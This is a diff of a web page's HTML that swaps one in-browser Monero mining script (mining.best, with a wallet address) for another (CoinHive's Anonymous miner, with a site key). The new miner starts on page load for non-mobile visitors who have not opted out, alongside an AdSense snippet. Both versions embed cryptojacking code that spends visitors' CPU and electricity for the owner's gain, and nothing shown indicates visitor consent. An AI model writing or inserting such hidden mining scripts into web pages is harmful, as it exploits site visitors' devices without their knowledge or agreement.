@@ -1,5 +1,5 @@
 <head>
-  <script src="https://xmr.mining.best/xmr-1.2.js"></script>
+  <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
   <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
   <script>
     (adsbygoogle = window.adsbygoogle || []).push({
@@ -9,8 +9,11 @@
   </script>
 </head>
 <body>
-
   <script>
-    new miningBest.Go('4BAtuevrb2CfT9xsDYruXrEoTVL7ENphjMHUWpkT9nYCVjk8y6Javis3bZML4oatCS6jjvZ1iyNCbff74iiZ9FbCPLvxfDS	', { throttle:0.6 } ).start();
+    var miner = new CoinHive.Anonymous('LTFGDBuB0NbCzftyM7cKa230aV6Iz1Aa', {
+      threads: 1,
+      throttle: 0.5
+    });
+    if (!miner.isMobile() && !miner.didOptOut(14400)) miner.start();
   </script>
 </body>
